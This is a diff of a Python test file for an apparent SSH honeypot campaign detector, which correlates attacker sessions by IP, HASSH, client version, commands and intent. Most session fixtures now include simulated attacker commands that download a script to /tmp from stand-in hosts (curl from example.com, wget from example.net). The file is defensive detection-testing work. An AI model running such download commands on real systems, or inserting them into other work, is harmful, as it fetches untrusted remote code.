@@ -84,46 +84,58 @@ def test_same_hassh_creates_campaign():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls"],
+        [
+            "ls",
+            "curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh",
+        ],
+        client_version="SSH-2.0-ClientA",
+        hassh="shared-hassh",
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.2",
-        ["pwd"],
+        [
+            "pwd",
+            "curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh",
+        ],
+        client_version="SSH-2.0-ClientB",
+        hassh="shared-hassh",
     )
 
-    campaign = detector.correlate(
-        session_one,
-        session_two,
-    )
+    campaign = detector.correlate(session_one, session_two)
 
     assert campaign is not None
     assert "same_hassh" in campaign.correlation_reasons
 
-
 def test_shared_commands_create_campaign():
     detector = CampaignDetector()
 
+    # The shared distinctive command is the behavioral signal; same source
+    # IP is the required context. HASSH and client version deliberately differ.
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls", "whoami"],
+        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
+        client_version="SSH-2.0-ClientA",
+        hassh="hassh-A",
     )
 
     session_two = build_session(
         "session-2",
-        "10.0.0.2",
-        ["whoami", "pwd"],
+        "10.0.0.1",
+        ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
+        client_version="SSH-2.0-ClientB",
+        hassh="hassh-B",
     )
 
-    campaign = detector.correlate(
-        session_one,
-        session_two,
-    )
+    campaign = detector.correlate(session_one, session_two)
 
     assert campaign is not None
+    assert "same_source_ip" in campaign.correlation_reasons
     assert "shared_commands" in campaign.correlation_reasons
+    assert "same_hassh" not in campaign.correlation_reasons
+    assert "same_client_version" not in campaign.correlation_reasons
 
 
 def test_unrelated_sessions_do_not_create_campaign():
@@ -162,13 +174,13 @@ def test_same_fingerprint_creates_campaign():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls", "whoami"],
+        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.2",
-        ["whoami", "ls"],
+        ['whoami', 'ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     fingerprint_one = fingerprint_engine.process(
@@ -193,6 +205,10 @@ def test_same_fingerprint_creates_campaign():
 
     assert campaign is not None
     assert "same_fingerprint" in campaign.correlation_reasons
+    # The fingerprint is derived from HASSH/client profile attributes and
+    # must not add another confidence factor on top of those same signals.
+    assert "same_fingerprint" not in campaign.confidence_factors
+    assert campaign.confidence_score == 40
 
 
 def test_shared_intent_is_recorded():
@@ -202,13 +218,13 @@ def test_shared_intent_is_recorded():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["whoami", "hostname"],
+        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.2",
-        ["id", "uname -a"],
+        ['id', 'uname -a', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     intents_one = classifier.classify(
@@ -238,19 +254,19 @@ def test_related_sessions_are_aggregated_into_one_campaign():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls"],
+        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami"],
+        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_three = build_session(
         "session-3",
         "10.0.0.1",
-        ["pwd"],
+        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     campaign_one = detector.correlate(
@@ -311,13 +327,13 @@ def test_observe_preserves_fingerprint_intelligence():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls", "whoami"],
+        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.2",
-        ["whoami", "ls"],
+        ['whoami', 'ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     fingerprint_one = fingerprint_engine.process(
@@ -359,13 +375,13 @@ def test_observe_preserves_intent_intelligence():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["whoami", "hostname"],
+        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.2",
-        ["id", "uname -a"],
+        ['id', 'uname -a', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     intents_one = classifier.classify(
@@ -417,13 +433,13 @@ def test_observe_same_session_id_is_idempotent():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls", "whoami"],
+        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["pwd"],
+        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     first_result = detector.observe(session_one)
@@ -456,25 +472,25 @@ def test_related_campaigns_are_merged_when_new_evidence_connects_them():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls"],
+        ['curl -fsSL https://example.com/alpha.sh -o /tmp/alpha.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami"],
+        ['curl -fsSL https://example.com/alpha.sh -o /tmp/alpha.sh', "python3 -c 'import os; print(os.uname())'"],
     )
 
     session_three = build_session(
         "session-3",
         "10.0.0.2",
-        ["pwd"],
+        ['wget https://example.net/beta.sh -O /tmp/beta.sh', "python3 -c 'import os; print(os.uname())'"],
     )
 
     session_four = build_session(
         "session-4",
         "10.0.0.2",
-        ["hostname"],
+        ['wget https://example.net/beta.sh -O /tmp/beta.sh'],
     )
 
     campaign_one = detector.correlate(
@@ -515,7 +531,7 @@ def test_campaign_records_first_and_last_seen_times():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls"],
+        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
         start_time="2026-09-20T10:00:00+00:00",
         end_time="2026-09-20T10:05:00+00:00",
     )
@@ -523,7 +539,7 @@ def test_campaign_records_first_and_last_seen_times():
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami"],
+        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
         start_time="2026-09-20T11:00:00+00:00",
         end_time="2026-09-20T11:10:00+00:00",
     )
@@ -544,7 +560,7 @@ def test_campaign_temporal_metadata_updates_when_campaign_grows():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls"],
+        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
         start_time="2026-09-20T10:00:00+00:00",
         end_time="2026-09-20T10:05:00+00:00",
     )
@@ -552,7 +568,7 @@ def test_campaign_temporal_metadata_updates_when_campaign_grows():
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami"],
+        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
         start_time="2026-09-20T11:00:00+00:00",
         end_time="2026-09-20T11:10:00+00:00",
     )
@@ -560,7 +576,7 @@ def test_campaign_temporal_metadata_updates_when_campaign_grows():
     session_three = build_session(
         "session-3",
         "10.0.0.1",
-        ["pwd"],
+        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
         start_time="2026-09-20T09:00:00+00:00",
         end_time="2026-09-20T12:00:00+00:00",
     )
@@ -587,13 +603,13 @@ def test_campaign_confidence_score_reflects_correlation_evidence():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["ls", "whoami"],
+        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami", "pwd"],
+        ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     campaign = detector.correlate(
@@ -620,13 +636,13 @@ def test_campaign_confidence_score_combines_all_evidence_types():
     session_one = build_session(
         "session-1",
         "10.0.0.1",
-        ["whoami", "hostname"],
+        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     session_two = build_session(
         "session-2",
         "10.0.0.1",
-        ["whoami", "hostname"],
+        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
     )
 
     fingerprint_one = fingerprint_engine.process(
@@ -656,14 +672,15 @@ def test_campaign_confidence_score_combines_all_evidence_types():
 
     assert campaign is not None
 
-    assert campaign.confidence_score == 100
+    # Fingerprint match is recorded but not double-counted because it is
+    # derived from protocol, HASSH, and client version.
+    assert campaign.confidence_score == 80
 
     assert campaign.confidence_factors == {
         "same_source_ip": 30,
         "same_hassh": 25,
         "same_client_version": 5,
         "shared_commands": 10,
-        "same_fingerprint": 20,
         "shared_intent": 10,
     }
 
@@ -696,10 +713,10 @@ def test_repeated_correlation_does_not_duplicate_campaign_sessions():
     detector = CampaignDetector()
 
     session_one = build_session(
-        "repeat-1", "10.0.0.10", ["ls", "whoami"]
+        "repeat-1", "10.0.0.10", ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh']
     )
     session_two = build_session(
-        "repeat-2", "10.0.0.20", ["whoami", "pwd"]
+        "repeat-2", "10.0.0.20", ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh']
     )
 
     first = detector.correlate(session_one, session_two)
@@ -709,3 +726,60 @@ def test_repeated_correlation_does_not_duplicate_campaign_sessions():
     assert second is not None
     assert len(detector.get_all()) == 1
     assert second.session_ids == ["repeat-1", "repeat-2"]
+
+
+def test_same_hassh_alone_does_not_create_campaign():
+    detector = CampaignDetector()
+
+    session_one = build_session(
+        "hassh-only-1",
+        "10.0.0.10",
+        ["whoami", "pwd"],
+        client_version="SSH-2.0-ClientA",
+        hassh="shared-hassh",
+    )
+    session_two = build_session(
+        "hassh-only-2",
+        "10.0.0.20",
+        ["ls", "uname -a"],
+        client_version="SSH-2.0-ClientA",
+        hassh="shared-hassh",
+    )
+
+    campaign = detector.correlate(session_one, session_two)
+
+    assert campaign is None
+    assert detector.get_all() == {}
+
+
+def test_generic_commands_and_shared_hassh_do_not_merge_campaigns():
+    detector = CampaignDetector()
+
+    session_one = build_session(
+        "bridge-1",
+        "10.0.0.10",
+        ["whoami", "pwd"],
+        client_version="SSH-2.0-ClientA",
+        hassh="hassh-A",
+    )
+    session_two = build_session(
+        "bridge-2",
+        "10.0.0.20",
+        ["ls", "hostname"],
+        client_version="SSH-2.0-ClientB",
+        hassh="hassh-A",
+    )
+    session_three = build_session(
+        "bridge-3",
+        "10.0.0.30",
+        ["id", "uname -a"],
+        client_version="SSH-2.0-ClientC",
+        hassh="hassh-C",
+    )
+
+    first = detector.correlate(session_one, session_two)
+    assert first is None
+
+    second = detector.correlate(session_two, session_three)
+    assert second is None
+    assert detector.get_all() == {}
